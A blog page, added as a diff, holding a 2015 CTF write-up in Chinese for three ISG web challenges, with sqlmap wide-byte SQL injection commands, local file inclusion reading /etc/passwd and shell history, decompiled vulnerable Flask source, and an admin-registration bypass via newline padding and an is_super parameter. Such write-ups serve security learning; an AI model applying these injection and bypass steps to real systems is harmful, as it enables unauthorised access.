@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <meta charset="utf-8" />
+        <title>ISG web write up</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+
+        <!--[if IE]>
+            <script src="https://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+        <![endif]-->
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">lili_blog </a></h1>
+                <nav><ul>
+                    <li><a href="/category/category.html">Category</a></li>
+                    <li class="active"><a href="/category/ctf-web.html">CTF web</a></li>
+                    <li><a href="/category/injection.html">InJection</a></li>
+                    <li><a href="/category/web.html">web</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/ISG web write up.html" rel="bookmark"
+           title="Permalink to ISG web write up">ISG web write up</a></h1>
+    </header>
+
+    <div class="entry-content">
+<footer class="post-info">
+        <abbr class="published" title="2015-10-22T10:28:00+02:00">
+                Published: 四 22 十月 2015
+        </abbr>
+
+        <address class="vcard author">
+                By                         <a class="url fn" href="/author/md4.html">MD4</a>
+        </address>
+<p>In <a href="/category/ctf-web.html">CTF web</a>.</p>
+<p>tags: <a href="/tag/ctf.html">CTF</a> </p>
+</footer><!-- /.post-info -->      <h3>Fruit Store</h3>
+<p>题目地址：http://202.120.7.140:8888</p>
+<p>描述:欢迎来到 ISG 水果店</p>
+<p>在try.php中存在宽字节注入，可以使用％BF进行报错注入，使用SQLMAP可以快速得到Flag：</p>
+<div class="highlight"><pre><span></span>sqlmap -u &quot;http://202.120.7.140:8888/try.php?fruit=pear%bf*&quot;
+</pre></div>
+
+
+<p>或者</p>
+<div class="highlight"><pre><span></span>sqlmap --tamper=unmagicquotes -u &quot;http://127.0.0.1/isg/sql1/try.php?fruit=pear
+</pre></div>
+
+
+<p>得到FLag为：</p>
+<div class="highlight"><pre><span></span>ISG{4404c0ed3837f705d30dc986f8811aa0}
+</pre></div>
+
+
+<h3>Image Database</h3>
+<p>题目地址：http://202.120.7.139:8888</p>
+<p>描述：听说小花椒喜欢看图片</p>
+<p>在读取文件处尝试LFI，读取/etc/passwd成功返回为base64格式，base64解码发现存在isg用户，尝试读取/home/isg/.bash_histroy，base64解码发现存在/home/isg/web/main.py文件，直接读取放回错误，尝试读取main.pyc，使用uncompyle2对main.pyc进行反编译，得到如下源码：</p>
+<div class="highlight"><pre><span></span><span class="c1">#Embedded file name: main.py</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="s1">&#39;IMG_SYS&#39;</span><span class="p">)</span>
+<span class="n">app</span><span class="o">.</span><span class="n">debug</span> <span class="o">=</span> <span class="bp">False</span>
+
+<span class="k">def</span> <span class="nf">secret_protect</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;secret/flag.txt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span> <span class="o">==</span> <span class="n">data</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s1">&#39;You Will Never Get What Dont Belong To U!&#39;</span>
+    <span class="k">return</span> <span class="n">data</span>
+
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/gettext_underbuilding&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">get_text</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">!=</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">)</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;address&#39;</span><span class="p">]</span>
+    <span class="n">text</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">&#39;static&#39;</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">text</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s1">&#39;main.py&#39;</span><span class="p">):</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="s1">&#39;You can not include yourself&#39;</span>
+    <span class="k">elif</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">secret_protect</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/getimg&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">get_img</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">!=</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">)</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;address&#39;</span><span class="p">]</span>
+    <span class="k">if</span> <span class="n">url</span> <span class="o">==</span> <span class="s1">&#39;&#39;</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">)</span>
+    <span class="n">text</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">&#39;static&#39;</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">text</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s1">&#39;main.py&#39;</span><span class="p">):</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="s1">&#39;You can not include yourself&#39;</span>
+    <span class="k">elif</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">secret_protect</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/main.py&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">m</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">)</span>
+
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">n</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="k">if</span> <span class="n">app</span><span class="o">.</span><span class="n">debug</span><span class="p">:</span>
+        <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="kn">from</span> <span class="nn">tornado.wsgi</span> <span class="kn">import</span> <span class="n">WSGIContainer</span>
+        <span class="kn">from</span> <span class="nn">tornado.httpserver</span> <span class="kn">import</span> <span class="n">HTTPServer</span>
+        <span class="kn">from</span> <span class="nn">tornado.ioloop</span> <span class="kn">import</span> <span class="n">IOLoop</span>
+        <span class="n">http_server</span> <span class="o">=</span> <span class="n">HTTPServer</span><span class="p">(</span><span class="n">WSGIContainer</span><span class="p">(</span><span class="n">app</span><span class="p">))</span>
+        <span class="n">http_server</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">5555</span><span class="p">)</span>
+        <span class="n">IOLoop</span><span class="o">.</span><span class="n">instance</span><span class="p">()</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+<span class="o">+++</span> <span class="n">okay</span> <span class="n">decompyling</span> <span class="n">main</span><span class="o">.</span><span class="n">pyc</span>
+<span class="c1"># decompiled 1 files: 1 okay, 0 failed, 0 verify failed</span>
+<span class="c1"># 2015.10.22 11:37:22 CST</span>
+</pre></div>
+
+
+<p>在代码中可以发现flag存在于secret目录下，对返回内容的base64格式有secret_protect函数进行检查，同样可以发现存在/gettext_underbuilding接口，读取明文格式的文件，绕过了secret_protect的检查，使用/gettext_underbuilding获取flag为：</p>
+<div class="highlight"><pre><span></span>ISG{i60f9827e771d7d2f9a1ae15743b0a20}
+</pre></div>
+
+
+<h3>SuperAdmin</h3>
+<p>题目地址：202.120.7.141:8888</p>
+<p>描述:简单的认证系统 </p>
+<p>在注册页面中尝试admin加上多个％0a注册，登录，绕过了admin的检查。得到提示，只有本地用户可以得到调试信息，于是将XXF改成127.0.0.1，得到如下调试信息：</p>
+<div class="highlight"><pre><span></span><span class="x">function runmagicquotes(&amp;</span><span class="p">$</span><span class="nv">svar</span><span class="x">)</span><span class="err">{</span><span class="x"></span>
+<span class="x">    if(!getmagicquotesgpc())</span><span class="err">{</span><span class="x"></span>
+<span class="x">        if( isarray(</span><span class="p">$</span><span class="nv">svar</span><span class="x">) )</span><span class="err">{</span><span class="x"></span>
+<span class="x">            foreach(</span><span class="p">$</span><span class="x"> svar as </span><span class="p">$</span><span class="nv">k</span><span class="x"> =&gt; </span><span class="p">$</span><span class="nv">v</span><span class="x">) </span>
+<span class="x">                </span><span class="p">$</span><span class="nv">svar</span><span class="x">[</span><span class="p">$</span><span class="nv">k</span><span class="x">] = runmagicquotes(</span><span class="p">$</span><span class="nv">v</span><span class="x">);</span>
+<span class="x">        }</span>
+<span class="x">        else</span><span class="err">{</span><span class="x"></span>
+<span class="x">            </span><span class="p">$</span><span class="nv">svar</span><span class="x"> = addslashes(</span><span class="p">$</span><span class="nv">svar</span><span class="x">); </span>
+<span class="x">        }</span>
+<span class="x">    }</span>
+<span class="x">    return </span><span class="p">$</span><span class="nv">svar</span><span class="x">;</span>
+<span class="x">}</span>
+<span class="x">...... ......</span>
+<span class="x">register(</span><span class="p">$</span><span class="nv">username</span><span class="x">, </span><span class="p">$</span><span class="nv">password</span><span class="x">, </span><span class="p">$</span><span class="nv">email</span><span class="x">, </span><span class="p">$</span><span class="nv">is_super</span><span class="x">);</span>
+</pre></div>
+
+
+<p>看出存在全局变量覆盖的问题，重新注册admin加上多个％0a的账号，加个is_super＝1的参数，登录得到flag：</p>
+<div class="highlight"><pre><span></span>ISG{e492d00f509b1ec69643a5e91b3f4ee9}
+</pre></div>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+                <div class="blogroll">
+                        <h2>blogroll</h2>
+                        <ul>
+                            <li><a href="http://getpelican.com/">Pelican</a></li>
+                            <li><a href="http://python.org/">Python.org</a></li>
+                            <li><a href="http://jinja.pocoo.org/">Jinja2</a></li>
+                            <li><a href="#">You can modify those links in your config file</a></li>
+                        </ul>
+                </div><!-- /.blogroll -->
+                <div class="social">
+                        <h2>social</h2>
+                        <ul>
+
+                            <li><a href="#">You can add links in your config file</a></li>
+                            <li><a href="#">Another social link</a></li>
+                        </ul>
+                </div><!-- /.social -->
+        </section><!-- /#extras -->
+
+        <footer id="contentinfo" class="body">
+                <address id="about" class="vcard body">
+                Proudly powered by <a href="http://getpelican.com/">Pelican</a>, which takes great advantage of <a href="http://python.org">Python</a>.
+                </address><!-- /#about -->
+
+                <p>The theme is by <a href="http://coding.smashingmagazine.com/2009/08/04/designing-a-html-5-layout-from-scratch/">Smashing Magazine</a>, thanks!</p>
+        </footer><!-- /#contentinfo -->
+
+</body>
+</html>
